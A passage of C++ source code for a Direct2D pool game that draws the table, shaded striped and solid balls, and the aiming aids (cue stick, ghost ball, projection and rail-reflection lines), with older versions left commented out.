                TABLE_BOTTOM + CUSHION_THICKNESS
            );
            pRT->FillRectangle(&outerRect, pFrameBrush);
            SafeRelease(&pFrameBrush);
        }

        // Draw Table Bed (Green Felt)
        pRT->CreateSolidColorBrush(TABLE_COLOR, &pBrush);
        if (!pBrush) return;
        D2D1_RECT_F tableRect = D2D1::RectF(TABLE_LEFT, TABLE_TOP, TABLE_RIGHT, TABLE_BOTTOM);
        pRT->FillRectangle(&tableRect, pBrush);
        SafeRelease(&pBrush);

        // Draw Cushions (Red Border)
        pRT->CreateSolidColorBrush(CUSHION_COLOR, &pBrush);
        if (!pBrush) return;
        // Top Cushion (split by middle pocket)
        pRT->FillRectangle(D2D1::RectF(TABLE_LEFT + HOLE_VISUAL_RADIUS, TABLE_TOP - CUSHION_THICKNESS, TABLE_LEFT + TABLE_WIDTH / 2.f - HOLE_VISUAL_RADIUS, TABLE_TOP), pBrush);
        pRT->FillRectangle(D2D1::RectF(TABLE_LEFT + TABLE_WIDTH / 2.f + HOLE_VISUAL_RADIUS, TABLE_TOP - CUSHION_THICKNESS, TABLE_RIGHT - HOLE_VISUAL_RADIUS, TABLE_TOP), pBrush);
        // Bottom Cushion (split by middle pocket)
        pRT->FillRectangle(D2D1::RectF(TABLE_LEFT + HOLE_VISUAL_RADIUS, TABLE_BOTTOM, TABLE_LEFT + TABLE_WIDTH / 2.f - HOLE_VISUAL_RADIUS, TABLE_BOTTOM + CUSHION_THICKNESS), pBrush);
        pRT->FillRectangle(D2D1::RectF(TABLE_LEFT + TABLE_WIDTH / 2.f + HOLE_VISUAL_RADIUS, TABLE_BOTTOM, TABLE_RIGHT - HOLE_VISUAL_RADIUS, TABLE_BOTTOM + CUSHION_THICKNESS), pBrush);
        // Left Cushion
        pRT->FillRectangle(D2D1::RectF(TABLE_LEFT - CUSHION_THICKNESS, TABLE_TOP + HOLE_VISUAL_RADIUS, TABLE_LEFT, TABLE_BOTTOM - HOLE_VISUAL_RADIUS), pBrush);
        // Right Cushion
        pRT->FillRectangle(D2D1::RectF(TABLE_RIGHT, TABLE_TOP + HOLE_VISUAL_RADIUS, TABLE_RIGHT + CUSHION_THICKNESS, TABLE_BOTTOM - HOLE_VISUAL_RADIUS), pBrush);
        SafeRelease(&pBrush);


        // Draw Pockets (Black Circles)
        pRT->CreateSolidColorBrush(POCKET_COLOR, &pBrush);
        if (!pBrush) return;
        for (int i = 0; i < 6; ++i) {
            D2D1_ELLIPSE ellipse = D2D1::Ellipse(pocketPositions[i], HOLE_VISUAL_RADIUS, HOLE_VISUAL_RADIUS);
            pRT->FillEllipse(&ellipse, pBrush);
        }
        SafeRelease(&pBrush);

        // Draw Headstring Line (White)
        pRT->CreateSolidColorBrush(D2D1::ColorF(0.4235f, 0.5647f, 0.1765f, 1.0f), &pBrush); // NEWCOLOR ::White => (0.2784, 0.4549, 0.1843)
        //pRT->CreateSolidColorBrush(D2D1::ColorF(D2D1::ColorF::White, 0.5f), &pBrush); // NEWCOLOR ::White => (0.2784, 0.4549, 0.1843)
        if (!pBrush) return;
        pRT->DrawLine(
            D2D1::Point2F(HEADSTRING_X, TABLE_TOP),
            D2D1::Point2F(HEADSTRING_X, TABLE_BOTTOM),
            pBrush,
            1.0f // Line thickness
        );
        SafeRelease(&pBrush);

        // Draw Semicircle facing West (flat side East)
        // Draw Semicircle facing East (curved side on the East, flat side on the West)
        ID2D1PathGeometry* pGeometry = nullptr;
        HRESULT hr = pFactory->CreatePathGeometry(&pGeometry);
        if (SUCCEEDED(hr) && pGeometry)
        {
            ID2D1GeometrySink* pSink = nullptr;
            hr = pGeometry->Open(&pSink);
            if (SUCCEEDED(hr) && pSink)
            {
                float radius = 60.0f; // Radius for the semicircle
                D2D1_POINT_2F center = D2D1::Point2F(HEADSTRING_X, (TABLE_TOP + TABLE_BOTTOM) / 2.0f);

                // For a semicircle facing East (curved side on the East), use the top and bottom points.
                D2D1_POINT_2F startPoint = D2D1::Point2F(center.x, center.y - radius); // Top point

                pSink->BeginFigure(startPoint, D2D1_FIGURE_BEGIN_HOLLOW);

                D2D1_ARC_SEGMENT arc = {};
                arc.point = D2D1::Point2F(center.x, center.y + radius); // Bottom point
                arc.size = D2D1::SizeF(radius, radius);
                arc.rotationAngle = 0.0f;
                // Use the correct identifier with the extra underscore:
                arc.sweepDirection = D2D1_SWEEP_DIRECTION_COUNTER_CLOCKWISE;
                arc.arcSize = D2D1_ARC_SIZE_SMALL;

                pSink->AddArc(&arc);
                pSink->EndFigure(D2D1_FIGURE_END_OPEN);
                pSink->Close();
                SafeRelease(&pSink);

                ID2D1SolidColorBrush* pArcBrush = nullptr;
                //pRT->CreateSolidColorBrush(D2D1::ColorF(D2D1::ColorF::White, 0.3f), &pArcBrush);
                pRT->CreateSolidColorBrush(D2D1::ColorF(0.4235f, 0.5647f, 0.1765f, 1.0f), &pArcBrush);
                if (pArcBrush)
                {
                    pRT->DrawGeometry(pGeometry, pArcBrush, 1.5f);
                    SafeRelease(&pArcBrush);
                }
            }
            SafeRelease(&pGeometry);
        }




    }


    // ----------------------------------------------
    //  Helper : clamp to [0,1] and lighten a colour
    // ----------------------------------------------
    static D2D1_COLOR_F Lighten(const D2D1_COLOR_F& c, float factor = 1.25f)
    {
        return D2D1::ColorF(
            std::min(1.0f, c.r * factor),
            std::min(1.0f, c.g * factor),
            std::min(1.0f, c.b * factor),
            c.a);
    }

    // ------------------------------------------------
    //  NEW  DrawBalls – radial-gradient “spot-light”
    // ------------------------------------------------
    void DrawBalls(ID2D1RenderTarget* pRT)
    {
        if (!pRT) return;

        ID2D1SolidColorBrush* pStripeBrush = nullptr;    // white stripe
        ID2D1SolidColorBrush* pBorderBrush = nullptr;    // black ring

        pRT->CreateSolidColorBrush(D2D1::ColorF(D2D1::ColorF::White), &pStripeBrush);
        pRT->CreateSolidColorBrush(D2D1::ColorF(D2D1::ColorF::Black), &pBorderBrush);

        for (const Ball& b : balls)
        {
            if (b.isPocketed) continue;

            //------------------------------------------
            // Build the radial gradient for THIS ball
            //------------------------------------------
            ID2D1GradientStopCollection* pStops = nullptr;
            ID2D1RadialGradientBrush* pRad = nullptr;

            D2D1_GRADIENT_STOP gs[3];
            gs[0].position = 0.0f;  gs[0].color = D2D1::ColorF(1, 1, 1, 0.95f);     // bright spot
            gs[1].position = 0.35f; gs[1].color = Lighten(b.color);                 // transitional
            gs[2].position = 1.0f;  gs[2].color = b.color;                          // base colour

            pRT->CreateGradientStopCollection(gs, 3, &pStops);

            if (pStops)
            {
                // Place the hot-spot slightly towards top-left to look more 3-D
                D2D1_POINT_2F origin = D2D1::Point2F(b.x - BALL_RADIUS * 0.4f,
                    b.y - BALL_RADIUS * 0.4f);

                D2D1_RADIAL_GRADIENT_BRUSH_PROPERTIES props =
                    D2D1::RadialGradientBrushProperties(
                        origin,                        // gradientOrigin
                        D2D1::Point2F(0, 0),           // offset (not used here)
                        BALL_RADIUS * 1.3f,            // radiusX
                        BALL_RADIUS * 1.3f);           // radiusY

                pRT->CreateRadialGradientBrush(props, pStops, &pRad);
                SafeRelease(&pStops);
            }

            //------------------------------------------
            //  Draw the solid or striped ball itself
            //------------------------------------------
            D2D1_ELLIPSE outer = D2D1::Ellipse(
                D2D1::Point2F(b.x, b.y), BALL_RADIUS, BALL_RADIUS);

            if (pRad)  pRT->FillEllipse(&outer, pRad);

            // ----------  Stripe overlay  -------------
            if (b.type == BallType::STRIPE && pStripeBrush)
            {
                // White band
                D2D1_RECT_F stripe = D2D1::RectF(
                    b.x - BALL_RADIUS,
                    b.y - BALL_RADIUS * 0.40f,
                    b.x + BALL_RADIUS,
                    b.y + BALL_RADIUS * 0.40f);
                pRT->FillRectangle(&stripe, pStripeBrush);

                // Inner circle (give stripe area same glossy shading)
                if (pRad)
                {
                    D2D1_ELLIPSE inner = D2D1::Ellipse(
                        D2D1::Point2F(b.x, b.y),
                        BALL_RADIUS * 0.60f,
                        BALL_RADIUS * 0.60f);
                    pRT->FillEllipse(&inner, pRad);
                }
            }

            // Black border
            if (pBorderBrush)
                pRT->DrawEllipse(&outer, pBorderBrush, 1.5f);

            SafeRelease(&pRad);
        }

        SafeRelease(&pStripeBrush);
        SafeRelease(&pBorderBrush);
    }

    /*void DrawBalls(ID2D1RenderTarget* pRT) {
        ID2D1SolidColorBrush* pBrush = nullptr;
        ID2D1SolidColorBrush* pStripeBrush = nullptr; // For stripe pattern

        pRT->CreateSolidColorBrush(D2D1::ColorF(0, 0, 0), &pBrush); // Placeholder
        pRT->CreateSolidColorBrush(D2D1::ColorF(D2D1::ColorF::White), &pStripeBrush);

        if (!pBrush || !pStripeBrush) {
            SafeRelease(&pBrush);
            SafeRelease(&pStripeBrush);
            return;
        }


        for (size_t i = 0; i < balls.size(); ++i) {
            const Ball& b = balls[i];
            if (!b.isPocketed) {
                D2D1_ELLIPSE ellipse = D2D1::Ellipse(D2D1::Point2F(b.x, b.y), BALL_RADIUS, BALL_RADIUS);

                // Set main ball color
                pBrush->SetColor(b.color);
                pRT->FillEllipse(&ellipse, pBrush);

                // Draw Stripe if applicable
                if (b.type == BallType::STRIPE) {
                    // Draw a white band across the middle (simplified stripe)
                    D2D1_RECT_F stripeRect = D2D1::RectF(b.x - BALL_RADIUS, b.y - BALL_RADIUS * 0.4f, b.x + BALL_RADIUS, b.y + BALL_RADIUS * 0.4f);
                    // Need to clip this rectangle to the ellipse bounds - complex!
                    // Alternative: Draw two colored arcs leaving a white band.
                    // Simplest: Draw a white circle inside, slightly smaller.
                    D2D1_ELLIPSE innerEllipse = D2D1::Ellipse(D2D1::Point2F(b.x, b.y), BALL_RADIUS * 0.6f, BALL_RADIUS * 0.6f);
                    pRT->FillEllipse(innerEllipse, pStripeBrush); // White center part
                    pBrush->SetColor(b.color); // Set back to stripe color
                    pRT->FillEllipse(innerEllipse, pBrush); // Fill again, leaving a ring - No, this isn't right.

                    // Let's try drawing a thick white line across
                    // This doesn't look great. Just drawing solid red for stripes for now.
                }

                // Draw Number (Optional - requires more complex text layout or pre-rendered textures)
                // if (b.id != 0 && pTextFormat) {
                //     std::wstring numStr = std::to_wstring(b.id);
                //     D2D1_RECT_F textRect = D2D1::RectF(b.x - BALL_RADIUS, b.y - BALL_RADIUS, b.x + BALL_RADIUS, b.y + BALL_RADIUS);
                //     ID2D1SolidColorBrush* pNumBrush = nullptr;
                //     D2D1_COLOR_F numCol = (b.type == BallType::SOLID || b.id == 8) ? D2D1::ColorF(D2D1::ColorF::Black) : D2D1::ColorF(D2D1::ColorF::White);
                //     pRT->CreateSolidColorBrush(numCol, &pNumBrush);
                //     // Create a smaller text format...
                //     // pRT->DrawText(numStr.c_str(), numStr.length(), pSmallTextFormat, &textRect, pNumBrush);
                //     SafeRelease(&pNumBrush);
                // }
            }
        }

        SafeRelease(&pBrush);
        SafeRelease(&pStripeBrush);
    }*/


    /*void DrawAimingAids(ID2D1RenderTarget* pRT) {
        // Condition check at start (Unchanged)
        //if (currentGameState != PLAYER1_TURN && currentGameState != PLAYER2_TURN &&
            //currentGameState != BREAKING && currentGameState != AIMING)
        //{
            //return;
        //}
            // NEW Condition: Allow drawing if it's a human player's active turn/aiming/breaking,
        // OR if it's AI's turn and it's in AI_THINKING state (calculating) or BREAKING (aiming break).
        bool isHumanInteracting = (!isPlayer2AI || currentPlayer == 1) &&
            (currentGameState == PLAYER1_TURN || currentGameState == PLAYER2_TURN ||
                currentGameState == BREAKING || currentGameState == AIMING);
        // AI_THINKING state is when AI calculates shot. AIMakeDecision sets cueAngle/shotPower.
        // Also include BREAKING state if it's AI's turn and isOpeningBreakShot for break aim visualization.
            // NEW Condition: AI is displaying its aim
        bool isAiVisualizingShot = (isPlayer2AI && currentPlayer == 2 &&
            currentGameState == AI_THINKING && aiIsDisplayingAim);

        if (!isHumanInteracting && !(isAiVisualizingShot || (currentGameState == AI_THINKING && aiIsDisplayingAim))) {
            return;
        }

        Ball* cueBall = GetCueBall();
        if (!cueBall || cueBall->isPocketed) return; // Don't draw if cue ball is gone

        ID2D1SolidColorBrush* pBrush = nullptr;
        ID2D1SolidColorBrush* pGhostBrush = nullptr;
        ID2D1StrokeStyle* pDashedStyle = nullptr;
        ID2D1SolidColorBrush* pCueBrush = nullptr;
        ID2D1SolidColorBrush* pReflectBrush = nullptr; // Brush for reflection line

        // Ensure render target is valid
        if (!pRT) return;

        // Create Brushes and Styles (check for failures)
        HRESULT hr;
        hr = pRT->CreateSolidColorBrush(AIM_LINE_COLOR, &pBrush);
        if FAILED(hr) { SafeRelease(&pBrush); return; }
        hr = pRT->CreateSolidColorBrush(D2D1::ColorF(D2D1::ColorF::White, 0.5f), &pGhostBrush);
        if FAILED(hr) { SafeRelease(&pBrush); SafeRelease(&pGhostBrush); return; }
        hr = pRT->CreateSolidColorBrush(D2D1::ColorF(0.6f, 0.4f, 0.2f), &pCueBrush);
        if FAILED(hr) { SafeRelease(&pBrush); SafeRelease(&pGhostBrush); SafeRelease(&pCueBrush); return; }
        // Create reflection brush (e.g., lighter shade or different color)
        hr = pRT->CreateSolidColorBrush(D2D1::ColorF(D2D1::ColorF::LightCyan, 0.6f), &pReflectBrush);
        if FAILED(hr) { SafeRelease(&pBrush); SafeRelease(&pGhostBrush); SafeRelease(&pCueBrush); SafeRelease(&pReflectBrush); return; }
        // Create a Cyan brush for primary and secondary lines //orig(75.0f / 255.0f, 0.0f, 130.0f / 255.0f);indigoColor
        D2D1::ColorF cyanColor(0.0, 255.0, 255.0, 255.0f);
        ID2D1SolidColorBrush* pCyanBrush = nullptr;
        hr = pRT->CreateSolidColorBrush(cyanColor, &pCyanBrush);
        if (FAILED(hr)) {
            SafeRelease(&pCyanBrush);
            // handle error if needed
        }
        // Create a Purple brush for primary and secondary lines
        D2D1::ColorF purpleColor(255.0f, 0.0f, 255.0f, 255.0f);
        ID2D1SolidColorBrush* pPurpleBrush = nullptr;
        hr = pRT->CreateSolidColorBrush(purpleColor, &pPurpleBrush);
        if (FAILED(hr)) {
            SafeRelease(&pPurpleBrush);
            // handle error if needed
        }

        if (pFactory) {
            D2D1_STROKE_STYLE_PROPERTIES strokeProps = D2D1::StrokeStyleProperties();
            strokeProps.dashStyle = D2D1_DASH_STYLE_DASH;
            hr = pFactory->CreateStrokeStyle(&strokeProps, nullptr, 0, &pDashedStyle);
            if FAILED(hr) { pDashedStyle = nullptr; }
        }


        // --- Cue Stick Drawing (Unchanged from previous fix) ---
        const float baseStickLength = 150.0f;
        const float baseStickThickness = 4.0f;
        float stickLength = baseStickLength * 1.4f;
        float stickThickness = baseStickThickness * 1.5f;
        float stickAngle = cueAngle + PI;
        float powerOffset = 0.0f;
        //if (isAiming && (currentGameState == AIMING || currentGameState == BREAKING)) {
            // Show power offset if human is aiming/dragging, or if AI is preparing its shot (AI_THINKING or AI Break)
        if ((isAiming && (currentGameState == AIMING || currentGameState == BREAKING)) || isAiVisualizingShot) { // Use the new condition
            powerOffset = shotPower * 5.0f;
        }
        D2D1_POINT_2F cueStickEnd = D2D1::Point2F(cueBall->x + cosf(stickAngle) * (stickLength + powerOffset), cueBall->y + sinf(stickAngle) * (stickLength + powerOffset));
        D2D1_POINT_2F cueStickTip = D2D1::Point2F(cueBall->x + cosf(stickAngle) * (powerOffset + 5.0f), cueBall->y + sinf(stickAngle) * (powerOffset + 5.0f));
        pRT->DrawLine(cueStickTip, cueStickEnd, pCueBrush, stickThickness);


        // --- Projection Line Calculation ---
        float cosA = cosf(cueAngle);
        float sinA = sinf(cueAngle);
        float rayLength = TABLE_WIDTH + TABLE_HEIGHT; // Ensure ray is long enough
        D2D1_POINT_2F rayStart = D2D1::Point2F(cueBall->x, cueBall->y);
        D2D1_POINT_2F rayEnd = D2D1::Point2F(rayStart.x + cosA * rayLength, rayStart.y + sinA * rayLength);*/

    void DrawAimingAids(ID2D1RenderTarget* pRT) {
        // Determine if aiming aids should be drawn.
        bool isHumanInteracting = (!isPlayer2AI || currentPlayer == 1) &&
            (currentGameState == PLAYER1_TURN || currentGameState == PLAYER2_TURN ||
                currentGameState == BREAKING || currentGameState == AIMING ||
                currentGameState == CHOOSING_POCKET_P1 || currentGameState == CHOOSING_POCKET_P2);

        // FOOLPROOF FIX: This is the new condition to show the AI's aim.
        bool isAiVisualizingShot = (isPlayer2AI && currentPlayer == 2 && aiIsDisplayingAim);

        if (!isHumanInteracting && !isAiVisualizingShot) {
            return;
        }

        Ball* cueBall = GetCueBall();
        if (!cueBall || cueBall->isPocketed) return;

        // --- Brush and Style Creation (No changes here) ---
        ID2D1SolidColorBrush* pBrush = nullptr;
        ID2D1SolidColorBrush* pGhostBrush = nullptr;
        ID2D1StrokeStyle* pDashedStyle = nullptr;
        ID2D1SolidColorBrush* pCueBrush = nullptr;
        ID2D1SolidColorBrush* pReflectBrush = nullptr;
        ID2D1SolidColorBrush* pCyanBrush = nullptr;
        ID2D1SolidColorBrush* pPurpleBrush = nullptr;
        pRT->CreateSolidColorBrush(AIM_LINE_COLOR, &pBrush);
        pRT->CreateSolidColorBrush(D2D1::ColorF(D2D1::ColorF::White, 0.5f), &pGhostBrush);
        pRT->CreateSolidColorBrush(D2D1::ColorF(0.6f, 0.4f, 0.2f), &pCueBrush);
        pRT->CreateSolidColorBrush(D2D1::ColorF(D2D1::ColorF::LightCyan, 0.6f), &pReflectBrush);
        pRT->CreateSolidColorBrush(D2D1::ColorF(D2D1::ColorF::Cyan), &pCyanBrush);
        pRT->CreateSolidColorBrush(D2D1::ColorF(D2D1::ColorF::Purple), &pPurpleBrush);
        if (pFactory) {
            D2D1_STROKE_STYLE_PROPERTIES strokeProps = D2D1::StrokeStyleProperties();
            strokeProps.dashStyle = D2D1_DASH_STYLE_DASH;
            pFactory->CreateStrokeStyle(&strokeProps, nullptr, 0, &pDashedStyle);
        }
        // --- End Brush Creation ---

        // --- FOOLPROOF FIX: Use the AI's planned angle and power for drawing ---
        float angleToDraw = cueAngle;
        float powerToDraw = shotPower;

        if (isAiVisualizingShot) {
            // When the AI is showing its aim, force the drawing to use its planned shot details.
            angleToDraw = aiPlannedShotDetails.angle;
            powerToDraw = aiPlannedShotDetails.power;
        }
        // --- End AI Aiming Fix ---

        // --- Cue Stick Drawing ---
        const float baseStickLength = 150.0f;
        const float baseStickThickness = 4.0f;
        float stickLength = baseStickLength * 1.4f;
        float stickThickness = baseStickThickness * 1.5f;
        float stickAngle = angleToDraw + PI; // Use the angle we determined
        float powerOffset = 0.0f;
        if ((isAiming || isDraggingStick) || isAiVisualizingShot) {
            powerOffset = powerToDraw * 5.0f; // Use the power we determined
        }
        D2D1_POINT_2F cueStickEnd = D2D1::Point2F(cueBall->x + cosf(stickAngle) * (stickLength + powerOffset), cueBall->y + sinf(stickAngle) * (stickLength + powerOffset));
        D2D1_POINT_2F cueStickTip = D2D1::Point2F(cueBall->x + cosf(stickAngle) * (powerOffset + 5.0f), cueBall->y + sinf(stickAngle) * (powerOffset + 5.0f));
        pRT->DrawLine(cueStickTip, cueStickEnd, pCueBrush, stickThickness);

        // --- Projection Line Calculation ---
        float cosA = cosf(angleToDraw); // Use the angle we determined
        float sinA = sinf(angleToDraw);
        float rayLength = TABLE_WIDTH + TABLE_HEIGHT;
        D2D1_POINT_2F rayStart = D2D1::Point2F(cueBall->x, cueBall->y);
        D2D1_POINT_2F rayEnd = D2D1::Point2F(rayStart.x + cosA * rayLength, rayStart.y + sinA * rayLength);

        // Find the first ball hit by the aiming ray
        Ball* hitBall = nullptr;
        float firstHitDistSq = -1.0f;
        D2D1_POINT_2F ballCollisionPoint = { 0, 0 }; // Point on target ball circumference
        D2D1_POINT_2F ghostBallPosForHit = { 0, 0 }; // Ghost ball pos for the hit ball

        hitBall = FindFirstHitBall(rayStart, cueAngle, firstHitDistSq);
        if (hitBall) {
            // Calculate the point on the target ball's circumference
            float collisionDist = sqrtf(firstHitDistSq);
            ballCollisionPoint = D2D1::Point2F(rayStart.x + cosA * collisionDist, rayStart.y + sinA * collisionDist);
            // Calculate ghost ball position for this specific hit (used for projection consistency)
            ghostBallPosForHit = D2D1::Point2F(hitBall->x - cosA * BALL_RADIUS, hitBall->y - sinA * BALL_RADIUS); // Approx.
        }

        // Find the first rail hit by the aiming ray
        D2D1_POINT_2F railHitPoint = rayEnd; // Default to far end if no rail hit
        float minRailDistSq = rayLength * rayLength;
        int hitRailIndex = -1; // 0:Left, 1:Right, 2:Top, 3:Bottom

        // Define table edge segments for intersection checks
        D2D1_POINT_2F topLeft = D2D1::Point2F(TABLE_LEFT, TABLE_TOP);
        D2D1_POINT_2F topRight = D2D1::Point2F(TABLE_RIGHT, TABLE_TOP);
        D2D1_POINT_2F bottomLeft = D2D1::Point2F(TABLE_LEFT, TABLE_BOTTOM);
        D2D1_POINT_2F bottomRight = D2D1::Point2F(TABLE_RIGHT, TABLE_BOTTOM);

        D2D1_POINT_2F currentIntersection;

        // Check Left Rail
        if (LineSegmentIntersection(rayStart, rayEnd, topLeft, bottomLeft, currentIntersection)) {
            float distSq = GetDistanceSq(rayStart.x, rayStart.y, currentIntersection.x, currentIntersection.y);
            if (distSq < minRailDistSq) { minRailDistSq = distSq; railHitPoint = currentIntersection; hitRailIndex = 0; }
        }
        // Check Right Rail
        if (LineSegmentIntersection(rayStart, rayEnd, topRight, bottomRight, currentIntersection)) {
            float distSq = GetDistanceSq(rayStart.x, rayStart.y, currentIntersection.x, currentIntersection.y);
            if (distSq < minRailDistSq) { minRailDistSq = distSq; railHitPoint = currentIntersection; hitRailIndex = 1; }
        }
        // Check Top Rail
        if (LineSegmentIntersection(rayStart, rayEnd, topLeft, topRight, currentIntersection)) {
            float distSq = GetDistanceSq(rayStart.x, rayStart.y, currentIntersection.x, currentIntersection.y);
            if (distSq < minRailDistSq) { minRailDistSq = distSq; railHitPoint = currentIntersection; hitRailIndex = 2; }
        }
        // Check Bottom Rail
        if (LineSegmentIntersection(rayStart, rayEnd, bottomLeft, bottomRight, currentIntersection)) {
            float distSq = GetDistanceSq(rayStart.x, rayStart.y, currentIntersection.x, currentIntersection.y);
            if (distSq < minRailDistSq) { minRailDistSq = distSq; railHitPoint = currentIntersection; hitRailIndex = 3; }
        }


        // --- Determine final aim line end point ---
        D2D1_POINT_2F finalLineEnd = railHitPoint; // Assume rail hit first
        bool aimingAtRail = true;

        if (hitBall && firstHitDistSq < minRailDistSq) {
            // Ball collision is closer than rail collision
            finalLineEnd = ballCollisionPoint; // End line at the point of contact on the ball
            aimingAtRail = false;
        }

        // --- Draw Primary Aiming Line ---
        pRT->DrawLine(rayStart, finalLineEnd, pBrush, 1.0f, pDashedStyle ? pDashedStyle : NULL);

        // --- Draw Target Circle/Indicator ---
        D2D1_ELLIPSE targetCircle = D2D1::Ellipse(finalLineEnd, BALL_RADIUS / 2.0f, BALL_RADIUS / 2.0f);
        pRT->DrawEllipse(&targetCircle, pBrush, 1.0f);

        // --- Draw Projection/Reflection Lines ---
        if (!aimingAtRail && hitBall) {
            // Aiming at a ball: Draw Ghost Cue Ball and Target Ball Projection
            D2D1_ELLIPSE ghostCue = D2D1::Ellipse(ballCollisionPoint, BALL_RADIUS, BALL_RADIUS); // Ghost ball at contact point
            pRT->DrawEllipse(ghostCue, pGhostBrush, 1.0f, pDashedStyle ? pDashedStyle : NULL);

            // Calculate target ball projection based on impact line (cue collision point -> target center)
            float targetProjectionAngle = atan2f(hitBall->y - ballCollisionPoint.y, hitBall->x - ballCollisionPoint.x);
            // Clamp angle calculation if distance is tiny
            if (GetDistanceSq(hitBall->x, hitBall->y, ballCollisionPoint.x, ballCollisionPoint.y) < 1.0f) {
                targetProjectionAngle = cueAngle; // Fallback if overlapping
            }

            D2D1_POINT_2F targetStartPoint = D2D1::Point2F(hitBall->x, hitBall->y);
            D2D1_POINT_2F targetProjectionEnd = D2D1::Point2F(
                hitBall->x + cosf(targetProjectionAngle) * 50.0f, // Projection length 50 units
                hitBall->y + sinf(targetProjectionAngle) * 50.0f
            );
            // Draw solid line for target projection
            //pRT->DrawLine(targetStartPoint, targetProjectionEnd, pBrush, 1.0f);

        //new code start

                    // Dual trajectory with edge-aware contact simulation
            D2D1_POINT_2F dir = {
                targetProjectionEnd.x - targetStartPoint.x,
                targetProjectionEnd.y - targetStartPoint.y
            };
            float dirLen = sqrtf(dir.x * dir.x + dir.y * dir.y);
            dir.x /= dirLen;
            dir.y /= dirLen;

            D2D1_POINT_2F perp = { -dir.y, dir.x };

            // Approximate cue ball center by reversing from tip
            D2D1_POINT_2F cueBallCenterForGhostHit = { // Renamed for clarity if you use it elsewhere
                targetStartPoint.x - dir.x * BALL_RADIUS,
                targetStartPoint.y - dir.y * BALL_RADIUS
            };

            // REAL contact-ball center - use your physics object's center:
            // (replace 'objectBallPos' with whatever you actually call it)
            // (targetStartPoint is already hitBall->x, hitBall->y)
            D2D1_POINT_2F contactBallCenter = targetStartPoint; // Corrected: Use the object ball's actual center
            //D2D1_POINT_2F contactBallCenter = D2D1::Point2F(hitBall->x, hitBall->y);

           // The 'offset' calculation below uses 'cueBallCenterForGhostHit' (originally 'cueBallCenter').
           // This will result in 'offset' being 0 because 'cueBallCenterForGhostHit' is defined
           // such that (targetStartPoint - cueBallCenterForGhostHit) is parallel to 'dir',
           // and 'perp' is perpendicular to 'dir'.
           // Consider Change 2 if this 'offset' is not behaving as intended for the secondary line.
            /*float offset = ((targetStartPoint.x - cueBallCenterForGhostHit.x) * perp.x +
                (targetStartPoint.y - cueBallCenterForGhostHit.y) * perp.y);*/
                /*float offset = ((targetStartPoint.x - cueBallCenter.x) * perp.x +
                    (targetStartPoint.y - cueBallCenter.y) * perp.y);
                float absOffset = fabsf(offset);
                float side = (offset >= 0 ? 1.0f : -1.0f);*/

                // Use actual cue ball center for offset calculation if 'offset' is meant to quantify the cut
            D2D1_POINT_2F actualCueBallPhysicalCenter = D2D1::Point2F(cueBall->x, cueBall->y); // This is also rayStart

            // Offset calculation based on actual cue ball position relative to the 'dir' line through targetStartPoint
            float offset = ((targetStartPoint.x - actualCueBallPhysicalCenter.x) * perp.x +
                (targetStartPoint.y - actualCueBallPhysicalCenter.y) * perp.y);
            float absOffset = fabsf(offset);
            float side = (offset >= 0 ? 1.0f : -1.0f);


            // Actual contact point on target ball edge
            D2D1_POINT_2F contactPoint = {
            contactBallCenter.x + perp.x * BALL_RADIUS * side,
            contactBallCenter.y + perp.y * BALL_RADIUS * side
            };

            // Tangent (cut shot) path from contact point
                // Tangent (cut shot) path: from contact point to contact ball center
            D2D1_POINT_2F objectBallDir = {
                contactBallCenter.x - contactPoint.x,
                contactBallCenter.y - contactPoint.y
            };
            float oLen = sqrtf(objectBallDir.x * objectBallDir.x + objectBallDir.y * objectBallDir.y);
            if (oLen != 0.0f) {
                objectBallDir.x /= oLen;
                objectBallDir.y /= oLen;
            }

            const float PRIMARY_LEN = 150.0f; //default=150.0f
            const float SECONDARY_LEN = 150.0f; //default=150.0f
            const float STRAIGHT_EPSILON = BALL_RADIUS * 0.05f;

            D2D1_POINT_2F primaryEnd = {
                targetStartPoint.x + dir.x * PRIMARY_LEN,
                targetStartPoint.y + dir.y * PRIMARY_LEN
            };

            // Secondary line starts from the contact ball's center
            D2D1_POINT_2F secondaryStart = contactBallCenter;
            D2D1_POINT_2F secondaryEnd = {
                secondaryStart.x + objectBallDir.x * SECONDARY_LEN,
                secondaryStart.y + objectBallDir.y * SECONDARY_LEN
            };

            if (absOffset < STRAIGHT_EPSILON)  // straight shot?
            {
                // Straight: secondary behind primary
                        // secondary behind primary {pDashedStyle param at end}
                pRT->DrawLine(secondaryStart, secondaryEnd, pPurpleBrush, 2.0f);
                //pRT->DrawLine(secondaryStart, secondaryEnd, pGhostBrush, 1.0f);
                pRT->DrawLine(targetStartPoint, primaryEnd, pCyanBrush, 2.0f);
                //pRT->DrawLine(targetStartPoint, primaryEnd, pBrush, 1.0f);
            }
            else
            {
                // Cut shot: both visible
                        // both visible for cut shot
                pRT->DrawLine(secondaryStart, secondaryEnd, pPurpleBrush, 2.0f);
                //pRT->DrawLine(secondaryStart, secondaryEnd, pGhostBrush, 1.0f);
                pRT->DrawLine(targetStartPoint, primaryEnd, pCyanBrush, 2.0f);
                //pRT->DrawLine(targetStartPoint, primaryEnd, pBrush, 1.0f);
            }
            // End improved trajectory logic

        //new code end

            // -- Cue Ball Path after collision (Optional, requires physics) --
            // Very simplified: Assume cue deflects, angle depends on cut angle.
            // float cutAngle = acosf(cosf(cueAngle - targetProjectionAngle)); // Angle between paths
            // float cueDeflectionAngle = ? // Depends on cutAngle, spin, etc. Hard to predict accurately.
            // D2D1_POINT_2F cueProjectionEnd = ...
            // pRT->DrawLine(ballCollisionPoint, cueProjectionEnd, pGhostBrush, 1.0f, pDashedStyle ? pDashedStyle : NULL);

            // --- Accuracy Comment ---
            // Note: The visual accuracy of this projection, especially for cut shots (hitting the ball off-center)
            // or shots with spin, is limited by the simplified physics model. Real pool physics involves
            // collision-induced throw, spin transfer, and cue ball deflection not fully simulated here.
            // The ghost ball method shows the *ideal* line for a center-cue hit without spin.

        }
        else if (aimingAtRail && hitRailIndex != -1) {
            // Aiming at a rail: Draw reflection line
            float reflectAngle = cueAngle;
            // Reflect angle based on which rail was hit
            if (hitRailIndex == 0 || hitRailIndex == 1) { // Left or Right rail
                reflectAngle = PI - cueAngle; // Reflect horizontal component
            }
            else { // Top or Bottom rail
                reflectAngle = -cueAngle; // Reflect vertical component
            }
            // Normalize angle if needed (atan2 usually handles this)
            while (reflectAngle > PI) reflectAngle -= 2 * PI;
            while (reflectAngle <= -PI) reflectAngle += 2 * PI;


            float reflectionLength = 60.0f; // Length of the reflection line
            D2D1_POINT_2F reflectionEnd = D2D1::Point2F(
                finalLineEnd.x + cosf(reflectAngle) * reflectionLength,
